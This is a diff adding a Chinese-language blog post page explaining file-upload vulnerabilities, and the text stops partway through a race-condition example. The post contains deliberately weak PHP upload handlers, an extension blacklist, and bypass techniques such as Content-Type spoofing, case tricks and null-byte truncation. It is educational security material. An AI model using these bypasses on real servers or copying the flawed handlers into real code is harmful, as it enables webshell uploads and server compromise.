@@ -1,0 +1,696 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/Str3am.jpg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/Str3am.jpg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Monda:300,300italic,400,400italic,700,700italic|Damion:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    hostname: new URL('https://jlkl.github.io').hostname,
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.7.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":true},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    comments: {"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: '',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}
+  };
+</script>
+
+  <meta name="description" content="1.前言&amp;emsp;本来打算是作为一个系列一直更新下去，讲解基础漏洞的原理、基本防御和攻击方法。但是看到师傅们的总结都很全面，尝试总结了一下发现大多都是照搬，只有等到有新的东西才写下来啦。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Web基础漏洞之文件上传">
+<meta property="og:url" content="https://jlkl.github.io/2019/01/05/Web_12/index.html">
+<meta property="og:site_name" content="Str3am&#39;s Blog">
+<meta property="og:description" content="1.前言&amp;emsp;本来打算是作为一个系列一直更新下去，讲解基础漏洞的原理、基本防御和攻击方法。但是看到师傅们的总结都很全面，尝试总结了一下发现大多都是照搬，只有等到有新的东西才写下来啦。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://jlkl.github.io/2019/01/05/Web_12/65frxezkji7ctjfklsg6loemca.png">
+<meta property="og:image" content="https://jlkl.github.io/2019/01/05/Web_12/9vj3h81d86cu96lmn4qtqwgkfb.png">
+<meta property="article:published_time" content="2019-01-05T07:22:18.000Z">
+<meta property="article:modified_time" content="2019-01-05T07:28:39.181Z">
+<meta property="article:author" content="Str3am">
+<meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://jlkl.github.io/2019/01/05/Web_12/65frxezkji7ctjfklsg6loemca.png">
+
+<link rel="canonical" href="https://jlkl.github.io/2019/01/05/Web_12/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>Web基础漏洞之文件上传 | Str3am's Blog</title>
+  
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?fcdffc3f3c9531fca765ea966be04985";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="Str3am's Blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Str3am's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags<span class="badge">14</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives<span class="badge">32</span></a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="en">
+    <link itemprop="mainEntityOfPage" href="https://jlkl.github.io/2019/01/05/Web_12/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/Str3am.jpg">
+      <meta itemprop="name" content="Str3am">
+      <meta itemprop="description" content="这个人很懒，什么也没留下">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Str3am's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Web基础漏洞之文件上传
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2019-01-05 15:22:18 / Modified: 15:28:39" itemprop="dateCreated datePublished" datetime="2019-01-05T15:22:18+08:00">2019-01-05</time>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Valine: </span>
+    
+    <a title="valine" href="/2019/01/05/Web_12/#comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2019/01/05/Web_12/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              <span>7.5k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              <span>9 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h2><p>&emsp;本来打算是作为一个系列一直更新下去，讲解基础漏洞的原理、基本防御和攻击方法。但是看到师傅们的总结都很全面，尝试总结了一下发现大多都是照搬，只有等到有新的东西才写下来啦。</p>
+<a id="more"></a>
+<h2 id="2-概述"><a href="#2-概述" class="headerlink" title="2.概述"></a>2.概述</h2><p>在Web程序中，经常需要用到文件上传的功能。如用户或者管理员上传图片，或者其它文件。如果没有限制上传类型或者限制不严格被绕过，就有可能造成文件上传漏洞。</p>
+<p>如果上传了可执行文件或者网页脚本，就会导致网站被控制甚至服务器沦陷。一般会搭配解析漏洞或文件包含漏洞。</p>
+<h2 id="3-上传检测"><a href="#3-上传检测" class="headerlink" title="3.上传检测"></a>3.上传检测</h2><p>通常一个文件以HTTP协议进行上传时，将以POST请求发送至Web服务器，Web服务器接收到请求并同意后，用户与Web服务器将建立连接，并传输数据。</p>
+<p>一般文件上传检测分为客户端检测和服务端检测</p>
+<h3 id="3-1-客户端检测"><a href="#3-1-客户端检测" class="headerlink" title="3.1.客户端检测"></a>3.1.客户端检测</h3><p>一般使用 javascript 检验后缀名是否合法，在浏览加载文件，但还未点击上传按钮时便弹出对话框,示例代码如下：</p>
+<figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">function CheckFileType()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> objButton=<span class="built_in">document</span>.getElementById(<span class="string">"Button1"</span>);<span class="comment">//上传按钮</span></span><br><span class="line">    <span class="keyword">var</span> objFileUpload=<span class="built_in">document</span>.getElementById(<span class="string">"FileUpload1"</span>);</span><br><span class="line">    <span class="keyword">var</span> objMSG=<span class="built_in">document</span>.getElementById(<span class="string">"msg"</span>);<span class="comment">//显示提示信息用DIV</span></span><br><span class="line">    <span class="keyword">var</span> FileName=<span class="keyword">new</span> <span class="built_in">String</span>(objFileUpload.value);<span class="comment">//文件名</span></span><br><span class="line">    <span class="keyword">var</span> <span class="keyword">extension</span>=<span class="keyword">new</span> <span class="built_in">String</span>(FileName.substring(FileName.lastIndexOf(<span class="string">"."</span>)+<span class="number">1</span>,FileName.length));<span class="comment">//文件扩展名</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">extension</span>==<span class="string">"jpg"</span>||<span class="keyword">extension</span>==<span class="string">"JPG"</span>)<span class="comment">//可以另行添加扩展名</span></span><br><span class="line">    &#123;</span><br><span class="line">        objButton.disabled=<span class="keyword">false</span>;<span class="comment">//启用上传按钮</span></span><br><span class="line">        objMSG.innerHTML=<span class="string">"文件检测通过"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        objButton.disabled=<span class="keyword">true</span>;<span class="comment">//禁用上传按钮</span></span><br><span class="line">        objMSG.innerHTML=<span class="string">"请选择正确的文件上传"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>绕过方法：</p>
+<ul>
+<li>将需要上传的恶意代码文件类型改为允许上传的类型，例如将shell.asp改为shell.jpg上传，配置Burp Suite代理进行抓包，然后再将文件名shell.jpg改为shell.asp</li>
+<li>上传页面，审查元素，修改或禁用 JavaScript 检测函数<h3 id="3-2-服务端检验"><a href="#3-2-服务端检验" class="headerlink" title="3.2.服务端检验"></a>3.2.服务端检验</h3><h4 id="3-2-1-MIME类型检测"><a href="#3-2-1-MIME类型检测" class="headerlink" title="3.2.1.MIME类型检测"></a>3.2.1.MIME类型检测</h4>MIME：使客户端软件，区分不同种类的数据，例如web浏览器就是通过MIME类型来判断文件是GIF图片，还是可打印的PostScript文件。web服务器使用MIME来说明发送数据的种类， web客户端使用MIME来说明希望接收到的数据种类。</li>
+</ul>
+<p>示例代码：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">'file'</span>][<span class="string">'type'</span>] != <span class="string">"image/gif"</span>)</span><br><span class="line">&#123;</span><br><span class="line">    echo <span class="string">"Sorry, we only allow uploading GIF images"</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$uploaddir</span> = <span class="string">'./'</span>;</span><br><span class="line"><span class="variable">$uploadfile</span> = <span class="variable">$uploaddir</span> . basename(<span class="variable">$_FILES</span>[<span class="string">'file'</span>][<span class="string">'name'</span>]);</span><br><span class="line"><span class="keyword">if</span> (move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], <span class="variable">$uploadfile</span>))</span><br><span class="line">&#123;</span><br><span class="line">    echo <span class="string">"File is valid, and was successfully uploaded.\n"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    echo <span class="string">"File uploading failed.\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>关键代码：<code>if($_FILES[&#39;file&#39;][&#39;type&#39;] != &quot;image/gif&quot;)</code></p>
+<p>绕过方法：</p>
+<p>Burp Suite代理进行抓包，将Content-Type修改为image/gif，或者其他允许的类型</p>
+<h4 id="3-2-2-文件扩展名检测"><a href="#3-2-2-文件扩展名检测" class="headerlink" title="3.2.2.文件扩展名检测"></a>3.2.2.文件扩展名检测</h4><p>分为白名单和黑名单检测，一般白名单比黑名单安全</p>
+<h5 id="3-2-2-1-黑名单检测"><a href="#3-2-2-1-黑名单检测" class="headerlink" title="3.2.2.1.黑名单检测"></a>3.2.2.1.黑名单检测</h5><p>黑名单的安全性比白名单低很多，服务器端，一般会有个专门的blacklist文件，里面会包含常见的危险脚本文件类型，例如：html | htm | php | php2 | hph3 | php4 | php5 | asp | aspx | ascx | jsp | cfm | cfc | bat | exe | com | dll | vbs | js | reg | cgi | htaccess | asis | sh |phtm | shtm |inc等等</p>
+<p>示例代码：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">getExt</span><span class="params">($filename)</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="comment">//sunstr - 返回字符串的子串</span></span></span><br><span class="line"><span class="php">    <span class="comment">//strripos — 计算指定字符串在目标字符串中最后一次出现的位置（不区分大小写）</span></span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> substr($filename,strripos($filename,<span class="string">'.'</span>)+<span class="number">1</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] &gt; <span class="number">0</span>)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"Error: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] . <span class="string">"&lt;br /&gt;"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">    $black_file = explode(<span class="string">"|"</span>,<span class="string">"php|jsp|asp"</span>);<span class="comment">//允许上传的文件类型组</span></span></span><br><span class="line"><span class="php">    $new_upload_file_ext = strtolower(getExt($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>])); <span class="comment">//取得被.隔开的最后字符串</span></span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(in_array($new_upload_file_ext,$black_file))</span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">		<span class="keyword">echo</span> <span class="string">"文件不合法"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">        $filename = time().<span class="string">"."</span>.$new_upload_file_ext;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>],<span class="string">"upload/"</span>.$filename))</span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> <span class="string">"Upload Success"</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<h5 id="3-2-2-2-白名单检测"><a href="#3-2-2-2-白名单检测" class="headerlink" title="3.2.2.2.白名单检测"></a>3.2.2.2.白名单检测</h5><p>仅允许指定的文件类型上传，比如仅与需上传jpg 、 gif 、 doc等类型的文件，其他全部禁止</p>
+<h5 id="3-2-2-3-绕过方法"><a href="#3-2-2-3-绕过方法" class="headerlink" title="3.2.2.3.绕过方法"></a>3.2.2.3.绕过方法</h5><p>①文件名大小写绕过</p>
+<p>用像 AsP，pHp 之类的文件名绕过黑名单检测</p>
+<p>②名单列表绕过</p>
+<p>能被解析的文件扩展名列表：</p>
+<p>jsp jspx jspf</p>
+<p>asp asa cer aspx cdx</p>
+<p>php php php3 php4</p>
+<p>exe exee</p>
+<p>③特殊文件名绕过</p>
+<p>比如发送的 http 包里把文件名改成 test.asp. 或 test.asp_(下划线为空格)，这种命名方式 在 windows 系统里是不被允许的，所以需要在 burp 之类里进行修改，然后绕过验证后，会 被 windows 系统自动去掉后面的<strong>点和空格</strong>，但要注意 <strong>Unix/Linux 系统没有这个特性</strong></p>
+<p>④0x00截断</p>
+<p>截断的核心，就是chr(0)这个字符，这个字符不为空(Null)，也不是空字符(“”)，更不是空格。 当程序在输出含有chr(0)变量时，chr(0)后面的数据会被停止，换句话说，就是误把它当成结束符，后面的数据直接忽略，这就导致漏洞产生 。</p>
+<p>伪代码演示</p>
+<figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">name</span>= getname(httprequest) <span class="comment">//假如这时候获取到的文件名是 help.asp.jpg(asp 后面为 0x00)</span></span><br><span class="line"><span class="keyword">type</span> =gettype(<span class="keyword">name</span>)        <span class="comment">//而在 gettype()函数里处理方式是从后往前扫描扩展名，所以判断为 jpg</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">type</span> == jpg)</span><br><span class="line">   SaveFileToPath(UploadPath.<span class="keyword">name</span>, <span class="keyword">name</span>)   <span class="comment">//但在这里却是以 0x00 作为文件名截断</span></span><br><span class="line"><span class="comment">//最后以 help.asp 存入路径里</span></span><br></pre></td></tr></table></figure>
+
+<p>示例代码：</p>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/*</span><br><span class="line">CVE-<span class="number">2015</span>-<span class="number">2348</span></span><br><span class="line"></span><br><span class="line">PHP before <span class="number">5.4</span>.<span class="number">39</span>, <span class="number">5.5</span>.x before <span class="number">5.5</span>.<span class="number">23</span>, <span class="keyword">and</span> <span class="number">5.6</span>.x before <span class="number">5.6</span>.<span class="number">7</span></span><br><span class="line"></span><br><span class="line">move_uploaded_file<span class="built_in">(string</span> <span class="variable">$filename</span><span class="built_in">,string</span> <span class="variable">$destination</span>)</span><br><span class="line"><span class="variable">$destination</span>参数代表得失上传文件移动的最终目的地址</span><br><span class="line">如果<span class="variable">$destination</span>变量是从用户<span class="variable">$_GET</span>或<span class="variable">$_POST</span>中获得的并且我们可控，</span><br><span class="line">那么我们可以利用空字符\x0<span class="number">0</span>来截断后面的拓展名，从而造成任意文件上传</span><br><span class="line">*/</span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_POST</span>[<span class="string">'Upload'</span>]))&#123;</span><br><span class="line">    <span class="variable">$target_path</span> = WEB_PAGE_TO_ROOT.<span class="string">"hackable/uploads/"</span>;</span><br><span class="line">    <span class="variable">$target_path</span> = <span class="variable">$target_path</span> . basename(<span class="variable">$_FILES</span>[<span class="string">'uploaded'</span>][<span class="string">'name'</span>]);</span><br><span class="line">    <span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[<span class="string">'uploaded'</span>][<span class="string">'name'</span>];</span><br><span class="line">    <span class="variable">$uploaded_ext</span> = substr(<span class="variable">$uploaded_name</span>, strrpos(<span class="variable">$uploaded_name</span>, <span class="string">'.'</span>) + <span class="number">1</span>);</span><br><span class="line">    <span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[<span class="string">'uploaded'</span>][<span class="string">'size'</span>];</span><br><span class="line">    <span class="keyword">if</span> ((<span class="variable">$uploaded_ext</span> == <span class="string">"jpg"</span> || <span class="variable">$uploaded_ext</span> == <span class="string">"JPG"</span> || <span class="variable">$uploaded_ext</span> == <span class="string">"jpeg"</span> || <span class="variable">$uploaded_ext</span> == <span class="string">"JPEG"</span>) &amp;&amp; (<span class="variable">$uploaded_size</span> &lt; <span class="number">100000</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">'uploaded'</span>][<span class="string">'tmp_name'</span>], <span class="variable">$_POST</span>[<span class="string">'drops'</span>])) &#123;</span><br><span class="line">            <span class="variable">$html</span> .= <span class="string">'&lt;pre&gt;'</span>;</span><br><span class="line">            <span class="variable">$html</span> .= <span class="string">'Your image was not uploaded.'</span>;</span><br><span class="line">            <span class="variable">$html</span> .= <span class="string">'&lt;/pre&gt;'</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$html</span> .= <span class="string">'&lt;pre&gt;'</span>;</span><br><span class="line">            <span class="variable">$html</span> .= <span class="variable">$target_path</span> . <span class="string">' succesfully uploaded!'</span>;</span><br><span class="line">            <span class="variable">$html</span> .= <span class="string">'&lt;/pre&gt;'</span>;</span><br><span class="line">        &#125;&#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$html</span> .= <span class="string">'&lt;pre&gt;'</span>;</span><br><span class="line">        <span class="variable">$html</span> .= <span class="string">'Your image was not uploaded.'</span>;</span><br><span class="line">        <span class="variable">$html</span> .= <span class="string">'&lt;/pre&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>move_uploaded_file($_FILES[&#39;name&#39;][&#39;tmp_name&#39;],&quot;/file.php\x00.jpg&quot;);</code></p>
+<p>这本应该创建一个名为file.php\x00.jpg的文件，但实际上创建的文件是file.php</p>
+<p>这里比较有趣的一点是在获取文件名后缀时</p>
+<p><code>$uploaded_ext = substr($uploaded_name, strrpos($uploaded_name, &#39;.&#39;) + 1);</code></p>
+<p>由于在C、PHP等语言的常用字符串处理函数中，0x00被认为是终止符，文件名为 <code>test.jpg0x00.php</code> 时 PHP 仍认为后缀为 jpg，这个特性在 PHP5-PHP7 都是存在的。</p>
+<h4 id="3-2-3-服务端文件内容检测"><a href="#3-2-3-服务端文件内容检测" class="headerlink" title="3.2.3.服务端文件内容检测"></a>3.2.3.服务端文件内容检测</h4><h5 id="3-2-3-1-文件头检测"><a href="#3-2-3-1-文件头检测" class="headerlink" title="3.2.3.1.文件头检测"></a>3.2.3.1.文件头检测</h5><p>常见文件头：</p>
+<p>JPG ： FF D8 FF E0 00 10 4A 46 49 46</p>
+<p>GIF ： 47 49 46 38 39 61 (GIF89a)</p>
+<p>PNG： 89 50 4E 47</p>
+<p><a href="https://weizhimiao.github.io/2016/10/23/PHP根据文件头检测文件类型/" target="_blank" rel="noopener">PHP根据文件头检测文件类型</a></p>
+<h5 id="3-2-3-2-文件相关信息检测"><a href="#3-2-3-2-文件相关信息检测" class="headerlink" title="3.2.3.2.文件相关信息检测"></a>3.2.3.2.文件相关信息检测</h5><p>一般就是检查图片文件的大小，图片文件的尺寸之类的信息,常用getimagesize()函数</p>
+<h5 id="3-2-3-3-绕过方法"><a href="#3-2-3-3-绕过方法" class="headerlink" title="3.2.3.3.绕过方法"></a>3.2.3.3.绕过方法</h5><p>通常，对于文件内容检查的绕过，就是直接用一个结构完整的文件进行恶意代码注入即可</p>
+<h2 id="4-其他"><a href="#4-其他" class="headerlink" title="4.其他"></a>4.其他</h2><h3 id="4-1-竞争上传"><a href="#4-1-竞争上传" class="headerlink" title="4.1.竞争上传"></a>4.1.竞争上传</h3><p>示例代码：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$allowtype = <span class="keyword">array</span>(<span class="string">"gif"</span>,<span class="string">"png"</span>,<span class="string">"jpg"</span>);</span></span><br><span class="line"><span class="php">$size = <span class="number">10000000</span>;</span></span><br><span class="line"><span class="php">$path = <span class="string">"./"</span>;</span></span><br><span class="line"><span class="php">$filename = $_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(is_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]))&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(!move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>],$path.$filename))&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>(<span class="string">"error:can not move"</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="string">"error:not an upload file！"</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$newfile = $path.$filename;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"file upload success.file path is: "</span>.$newfile.<span class="string">"\n&lt;br /&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>($_FILES[<span class="string">'file'</span>][<span class="string">'error'</span>]&gt;<span class="number">0</span>)&#123;</span></span><br><span class="line"><span class="php">    unlink($newfile);</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="string">"Upload file error: "</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$ext = array_pop(explode(<span class="string">"."</span>,$_FILES[<span class="string">'file'</span>][<span 